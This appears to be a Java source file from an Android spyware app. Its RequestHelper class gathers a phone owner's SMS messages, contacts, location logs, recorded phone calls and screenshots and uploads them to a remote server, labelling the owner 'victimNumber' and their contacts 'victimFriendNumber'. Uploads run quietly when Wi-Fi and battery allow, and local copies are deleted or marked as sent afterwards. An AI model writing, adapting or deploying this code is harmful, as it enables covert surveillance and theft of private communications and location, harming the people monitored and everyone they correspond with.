package com.sunnet.service.task.request;

import android.os.StrictMode;

import com.google.gson.Gson;
import com.sunnet.service.asynctask.ConcurrentAsyncTask;
import com.sunnet.service.db.DatabaseHelper;
import com.sunnet.service.db.entity.CallVoiceEntity;
import com.sunnet.service.db.entity.CaptureEntity;
import com.sunnet.service.db.entity.ContactEntity;
import com.sunnet.service.db.entity.LocationEntity;
import com.sunnet.service.db.entity.SMSEntity;
import com.sunnet.service.log.Log;
import com.sunnet.service.task.response.BaseResponse;
import com.sunnet.service.task.response.ContactResponse;
import com.sunnet.service.task.response.LocationResponse;
import com.sunnet.service.task.response.SmsResponse;
import com.sunnet.service.task.sender.ContactSender;
import com.sunnet.service.task.sender.LocationSender;
import com.sunnet.service.task.sender.SmsSender;
import com.sunnet.service.task.sender.UploadFileSender;
import com.sunnet.service.task.vo.ContactData;
import com.sunnet.service.task.vo.LocationData;
import com.sunnet.service.task.vo.SmsData;
import com.sunnet.service.util.ConfigApi;
import com.sunnet.service.util.CryptoUtils;
import com.sunnet.service.util.SharedPreferencesUtility;
import com.sunnet.service.util.ThreadPool;
import com.sunnet.service.util.Utils;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Set;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * All software created will be owned by
 * Patient Doctor Technologies, Inc. in USA
 */
public class RequestHelper {

    private static String genToken(long time) {
        return Utils.hashMac(ConfigApi.API_KEY + "/" + time + "/tvhanh");
    }

    private static long getCurrentTimeStamp() {
        return System.currentTimeMillis() / 1000;
    }

    //-- Update SMS to server

    private static void updateSms(final List<SMSEntity> smsList) {
        if (Utils.canBatteryLow() || smsList == null || smsList.size() == 0 || !Utils.isConnectedViaWifi())
            return;

        new ConcurrentAsyncTask<List<SMSEntity>, Void, Object[]>() {
            @Override
            protected Object[] doInBackground(List<SMSEntity>... params) {
                List<SMSEntity> smsList = params[0];
                HashMap<String, SmsData> map = new HashMap<>();
                SmsData smsData;
                String key;
                for (SMSEntity sms : smsList) {
                    SmsData.Data content = new SmsData.Data();
                    content.content = sms.getBody();
                    content.timestamp = Long.parseLong(sms.getDate());
                    content.type = sms.getType();
                    key = sms.getReceiver() + sms.getSender();
                    smsData = map.get(key);

                    if (smsData == null) {
                        smsData = new SmsData();
                        smsData.victimNumber = sms.getReceiver();
                        smsData.victimFriendNumber = sms.getSender();
                        smsData.dataList = new ArrayList<>();
                        smsData.dataList.add(content);

                        map.put(key, smsData);
                    } else {
                        smsData.dataList.add(content);
                    }
                }
                List<SmsData> dataList = new ArrayList<>();
                Set<String> keys = map.keySet();
                for (String key2 : keys) {
                    dataList.add(map.get(key2));
                }
                return new Object[]{new Gson().toJson(dataList), smsList};
            }

            @Override
            protected void onPostExecute(final Object[] res) {
                SmsSender sender = new SmsSender();
                sender.time = getCurrentTimeStamp();
                sender.apiKey = ConfigApi.API_KEY;
                sender.token = genToken(sender.time);
                sender.sms = (String) res[0];

                SmsRequest request = new SmsRequest(sender, new Callback<SmsResponse>() {
                    @Override
                    public void onResponse(Call<SmsResponse> call, Response<SmsResponse> response) {
                        if (response != null && response.body() != null && response.body().isSuccess()) {
                            //-- Remove all data upload successfully
                            final List<SMSEntity> smsList = (List<SMSEntity>) res[1];
                            ThreadPool.doDatabase(new Runnable() {
                                @Override
                                public void run() {
                                    for (SMSEntity sms : smsList) {
                                        sms.setStatus(1);
                                    }
                                    DatabaseHelper.updateSms(smsList);
                                }
                            });
                        }
                    }

                    @Override
                    public void onFailure(Call<SmsResponse> call, Throwable t) {
                        Log.e(RequestHelper.class.getName() + " SmsRequest:" + t.toString());
                    }
                });
                request.execute();
            }
        }.executeConcurrently(smsList);
    }

    public static void updateSmsToServer(final List<SMSEntity> list) {
        if (list.size() > 200) {
            int size = list.size();
            int countList = size / 200 + 1;

            int next = 0;
            for (int i = 0; i < countList; i++) {
                List<SMSEntity> newList = new ArrayList<>();
                for (int j = next; j < size; j++) {
                    newList.add(list.get(j));
                    if (j >= (200 * (i + 1))) {
                        next = j;
                        break;
                    }
                }
                if (newList.size() > 0) {
                    updateSms(newList);
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        } else
            updateSms(list);
    }

    //-- Update Location to server
    public static void updateLocationToServer(final List<LocationEntity> locList) {

        if (locList == null || locList.size() == 0 || !Utils.isNetworkAvailable())
            return;

//        if (Utils.canBatteryLow() || locList == null || locList.size() == 0 || !Utils.isConnectedViaWifi())
//            return;

        new ConcurrentAsyncTask<List<LocationEntity>, Void, Object[]>() {
            @Override
            protected Object[] doInBackground(List<LocationEntity>... params) {
                List<LocationEntity> locList = params[0];
                LocationData locData = new LocationData();
                locData.logsList = new ArrayList<>();
                locData.victimNumber = CryptoUtils.encryptReturnValueWhenError(Utils.getPhoneNumber());

                for (LocationEntity loc : locList) {
                    locData.logsList.add(new LocationData.Logs(loc));
                }
                return new Object[]{"[" + new Gson().toJson(locData) + "]", locList};
            }

            @Override
            protected void onPostExecute(final Object[] res) {
                LocationSender sender = new LocationSender();
                sender.time = getCurrentTimeStamp();
                sender.apiKey = ConfigApi.API_KEY;
                sender.token = genToken(sender.time);
                sender.locations = (String) res[0];

                LocationRequest request = new LocationRequest(sender, new Callback<LocationResponse>() {
                    @Override
                    public void onResponse(Call<LocationResponse> call, Response<LocationResponse> response) {
                        if (response != null && response.body() != null && response.body().isSuccess()) {
                            //-- Remove all data upload successfully
                            final List<LocationEntity> locList = (List<LocationEntity>) res[1];
                            ThreadPool.doDatabase(new Runnable() {
                                @Override
                                public void run() {
                                    DatabaseHelper.deleteLocation(locList);
                                }
                            });
                        }
                    }

                    @Override
                    public void onFailure(Call<LocationResponse> call, Throwable t) {
                        Log.e(RequestHelper.class.getName() + " LocationRequest:" + t.toString());
                    }
                });
                request.execute();
            }
        }.executeConcurrently(locList);
    }

    //-- Update Contact to server
    public static void updateContactToServer(final List<ContactEntity> list) {
        if (list.size() > 200) {
            int size = list.size();
            int countList = size / 200 + 1;

            int next = 0;
            for (int i = 0; i < countList; i++) {
                List<ContactEntity> newList = new ArrayList<>();
                for (int j = next; j < size; j++) {
                    newList.add(list.get(j));
                    if (j >= (200 * (i + 1))) {
                        next = j;
                        break;
                    }
                }
                if (newList.size() > 0) {
                    updateContact(newList);
                    try {
                        Thread.sleep(3000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        } else
            updateContact(list);
    }

    public static void updateContact(final List<ContactEntity> contactList) {
        if (Utils.canBatteryLow() || contactList == null || contactList.size() == 0 || !Utils.isConnectedViaWifi())
            return;

        new ConcurrentAsyncTask<List<ContactEntity>, Void, Object[]>() {
            @Override
            protected Object[] doInBackground(List<ContactEntity>... params) {
                List<ContactEntity> contactList = params[0];
                List<ContactData> contactDataList = new ArrayList<>();

                for (ContactEntity contact : contactList) {
                    contactDataList.add(new ContactData(contact));
                }
                return new Object[]{new Gson().toJson(contactDataList), contactList};
            }

            @Override
            protected void onPostExecute(final Object[] res) {
                ContactSender sender = new ContactSender();
                sender.time = getCurrentTimeStamp();
                sender.apiKey = ConfigApi.API_KEY;
                sender.token = genToken(sender.time);
                sender.contacts = (String) res[0];

                ContactRequest request = new ContactRequest(sender, new Callback<ContactResponse>() {
                    @Override
                    public void onResponse(Call<ContactResponse> call, Response<ContactResponse> response) {
                        if (response != null && response.body() != null && response.body().isSuccess()) {
                            //-- Remove all data upload successfully
                            SharedPreferencesUtility.getInstance().putBoolean(
                                    SharedPreferencesUtility.CONTACT_CHANGED, false
                            );
                            final List<ContactEntity> contactList = (List<ContactEntity>) res[1];
                            ThreadPool.doDatabase(new Runnable() {
                                @Override
                                public void run() {
                                    for (ContactEntity contact : contactList) {
                                        contact.setStatus(1);
                                    }
                                    DatabaseHelper.updateAllContact(contactList);
                                }
                            });
                        }
                    }

                    @Override
                    public void onFailure(Call<ContactResponse> call, Throwable t) {
                        Log.e(RequestHelper.class.getName() + " ContactRequest:" + t.toString());
                    }
                });
                request.execute();
            }
        }.executeConcurrently(contactList);
    }

    //-- Upload call voice file to server
    public static void uploadCallVoiceToServer(final CallVoiceEntity callVoice) {
        if (Utils.canBatteryLow() || callVoice == null || !Utils.isConnectedViaWifi() || !Utils.existFile(callVoice.getAudio()))
            return;

        final UploadFileSender sender = new UploadFileSender();
        sender.uri = callVoice.getAudio();
        sender.apiKey = ConfigApi.API_KEY;
        //sender.phoneNumber = CryptoUtils.encryptReturnValueWhenError(Utils.getPhoneNumber());
        sender.phoneNumber = Utils.getPhoneNumber();
        sender.phoneNumberOrAppPackage = callVoice.getPhoneNumber();
        //sender.time = Calendar.getInstance().getTimeInMillis();

        /**
         *  Using HttpURLConnection
         */
        String response = "";
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;

        String pathToOurFile = sender.uri;
        String urlServer = ConfigApi.URL_HOST_UPLOAD + ConfigApi.UPLOAD + "/";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024;
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
            URL url = new URL(urlServer);
            connection = (HttpURLConnection) url.openConnection();

            // Allow Inputs & Outputs
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setChunkedStreamingMode(1024);
            // Enable POST method
            connection.setRequestMethod("POST");

            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);
            connection.setRequestProperty("provideAPIKey", sender.apiKey);
            connection.setRequestProperty("phoneNumber", sender.phoneNumber);
            connection.setRequestProperty("phoneNumberOrAppPackage", sender.phoneNumberOrAppPackage);

            Log.d("Upload audio: " + sender.toString());

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);

            String connstr = null;
            connstr = "Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
                    + pathToOurFile + "\"" + lineEnd;
            Log.i("Connstr " + connstr);

            outputStream.writeBytes(connstr);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // Read file
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            Log.e("Image length " + bytesAvailable + "");
            try {
                while (bytesRead > 0) {
                    try {
                        outputStream.write(buffer, 0, bufferSize);
                    } catch (OutOfMemoryError e) {
                        e.printStackTrace();
                        response = "outofmemoryerror";
                        Log.e("Upload file " + response);
                        return;
                    }
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
            } catch (Exception e) {
                e.printStackTrace();
                response = "error";
                Log.e("Upload file " + response);
                return;
            }
            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);

            BufferedReader br;
            if (200 <= connection.getResponseCode() && connection.getResponseCode() <= 299) {
                br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
            } else {
                br = new BufferedReader(new InputStreamReader((connection.getErrorStream())));
            }

            String line;
            String text = "";
            while ((line = br.readLine()) != null) {
                text += line + "\n";
            }

            response = text;
            br.close();
            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
            outputStream = null;
        } catch (Exception ex) {
            // Exception handling
            response = "error";
            Log.e("Send file Exception " + ex.getMessage() + "");
            ex.printStackTrace();
        }

        Log.i("Upload file " + response);
        try {
            BaseResponse res = new Gson().fromJson(response, BaseResponse.class);
            if (res != null && res.isSuccess()) {
                Log.e(RequestHelper.class.getName() + " UploadFileRequest successfully");
                ThreadPool.doDatabase(new Runnable() {
                    @Override
                    public void run() {
                        DatabaseHelper.deleteVoiceCall(callVoice);
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Upload screenshot file to server
    public static void updateScreenshotToServer(final CaptureEntity entity) {
        if (Utils.canBatteryLow() || entity == null || !Utils.isConnectedViaWifi() || !Utils.existFile(entity.getPicture()))
            return;

        /*StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);*/

        final UploadFileSender sender = new UploadFileSender();
        sender.uri = entity.getPicture();
        sender.apiKey = ConfigApi.API_KEY;
        //sender.phoneNumber = CryptoUtils.encryptReturnValueWhenError(Utils.getPhoneNumber());
        sender.phoneNumber = entity.getPhone();
        //sender.phoneNumberOrAppPackage = MyApplication.getContext().getPackageName();
        sender.phoneNumberOrAppPackage = entity.getTopPackage();
        //sender.time = Calendar.getInstance().getTimeInMillis();

        /**
         *  Using HttpURLConnection
         */
        String response = "";
        HttpURLConnection connection = null;
        DataOutputStream outputStream = null;

        String pathToOurFile = sender.uri;
        String urlServer = ConfigApi.URL_HOST_UPLOAD + ConfigApi.UPLOAD + "/";
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";

        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 1 * 1024;
        try {
            FileInputStream fileInputStream = new FileInputStream(new File(pathToOurFile));
            URL url = new URL(urlServer);
            connection = (HttpURLConnection) url.openConnection();

            // Allow Inputs & Outputs
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setUseCaches(false);
            connection.setChunkedStreamingMode(1024);
            // Enable POST method
            connection.setRequestMethod("POST");

            connection.setRequestProperty("Connection", "Keep-Alive");
            connection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);
            connection.setRequestProperty("provideAPIKey", sender.apiKey);
            connection.setRequestProperty("phoneNumber", sender.phoneNumber);
            connection.setRequestProperty("phoneNumberOrAppPackage", sender.phoneNumberOrAppPackage);

            Log.d("Upload audio: " + sender.toString());

            outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(twoHyphens + boundary + lineEnd);

            String connstr = null;
            connstr = "Content-Disposition: form-data; name=\"uploaded_file\";filename=\""
                    + pathToOurFile + "\"" + lineEnd;
            Log.i("Connstr " + connstr);

            outputStream.writeBytes(connstr);
            outputStream.writeBytes(lineEnd);

            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];

            // Read file
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);
            Log.e("Image length " + bytesAvailable + "");
            try {
                while (bytesRead > 0) {
                    try {
                        outputStream.write(buffer, 0, bufferSize);
                    } catch (OutOfMemoryError e) {
                        e.printStackTrace();
                        response = "outofmemoryerror";
                        Log.e("Upload file " + response);
                        return;
                    }
                    bytesAvailable = fileInputStream.available();
                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
                }
            } catch (Exception e) {
                e.printStackTrace();
                response = "error";
                Log.e("Upload file " + response);
                return;
            }
            outputStream.writeBytes(lineEnd);
            outputStream.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);

            BufferedReader br;
            if (200 <= connection.getResponseCode() && connection.getResponseCode() <= 299) {
                br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
            } else {
                br = new BufferedReader(new InputStreamReader((connection.getErrorStream())));
            }

            String line;
            String text = "";
            while ((line = br.readLine()) != null) {
                text += line + "\n";
            }

            response = text;
            br.close();
            fileInputStream.close();
            outputStream.flush();
            outputStream.close();
            outputStream = null;
        } catch (Exception ex) {
            // Exception handling
            response = "error";
            Log.e("Send file Exception " + ex.getMessage() + "");
            ex.printStackTrace();
        }
        Log.i("Upload file " + response);

        try {
            BaseResponse res = new Gson().fromJson(response, BaseResponse.class);
            if (res != null && res.isSuccess()) {
                Log.e(RequestHelper.class.getName() + " UploadFileRequest successfully");
                ThreadPool.doDatabase(new Runnable() {
                    @Override
                    public void run() {
                        DatabaseHelper.deleteCapture(entity);
                    }
                });
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
